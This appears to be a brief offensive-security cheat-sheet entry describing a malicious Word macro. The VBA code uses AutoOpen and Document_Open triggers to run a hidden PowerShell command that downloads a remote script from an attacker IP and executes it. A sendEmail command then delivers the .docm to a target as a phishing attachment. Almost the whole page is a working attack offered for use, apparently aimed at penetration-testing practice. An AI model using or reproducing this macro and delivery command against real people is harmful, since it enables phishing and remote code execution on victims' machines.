---
title: "Word Macro"
---

# Word Macro

VBA macro with `AutoOpen` and `Document_Open` triggers for PowerShell payload execution when a `.docm` document is opened. Includes email delivery via `sendEmail` for phishing campaigns.

```vb
Sub AutoOpen()
    cehb
End Sub

Sub Document_Open()
    cehb
End Sub

Sub cehb()
    Dim zoltan As String
    zoltan = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.49.117/cehb.ps1')|IEX"
    Shell zoltan, vbHide
End Sub
```

```shell
# Send the document via email
sendEmail -t target@domain.com -f user@domain.com -u "File" -m "Get the file" -s 192.168.100.2 -a file.docm
```
